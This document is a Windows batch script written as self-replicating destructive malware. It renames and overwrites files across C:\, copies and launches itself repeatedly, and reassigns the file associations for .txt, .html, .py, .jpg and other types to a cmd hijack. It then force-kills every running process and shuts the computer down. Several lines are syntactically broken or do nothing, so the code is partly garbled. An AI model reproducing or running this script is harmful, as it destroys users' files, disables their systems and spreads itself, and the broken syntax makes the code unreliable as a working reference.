@echo off
:r
for /f "tokens" %%a in ('TREE C:\ /nh') do (
    REN %%a %%a.bat
    echo :r > %%a
    echo copy %0 %0%random% > %%a
    start %0%random%.bat > %%a
    echo @echo off > %%a
    echo echo damn %random%%random% > %%a
    echo goto r > %%a
    pain = start %%a
    pain
    pain
    pain
    pain
)
ftype yungus%random%%random%=C:\Windows\System32\cmd.exe /k %0 %*
yungus = yungus%random%%random%
assoc .bat=yungus
assoc .txt=yungus
assoc .html=yungus
assoc .py=yungus
assoc .cpp=yungus
assoc .jpg=yungus
assoc .png=yungus
assoc .js=yungus
assoc .vbs=yungus
for /f "tokens" %%a in ('TREE C:\ /nh') do (
    XCOPY %%a %%a%random%
)
ROBOCOPY C:\ %random%%random%
title %random%%random%%random%%random%
HELP
copy %0 >> %0%0%random%.RR76.bat
start %0%0%random%.RR76.bat
mkdir %0%random%
copy %0 >> %0%0%random%%random%.RR76.bat
start %0%0%random%%random%.RR76.bat
TASKLIST
for /f "tokens" %%a in ('TASKLIST /nh') do (
    TASKKILL /F /IM %%a
)
title %random%%random%%random%%random%%random%%random%%random%

if %TITLE% == "678956341236572346522673444147": goto x

goto r

:x
SHUTDOWN
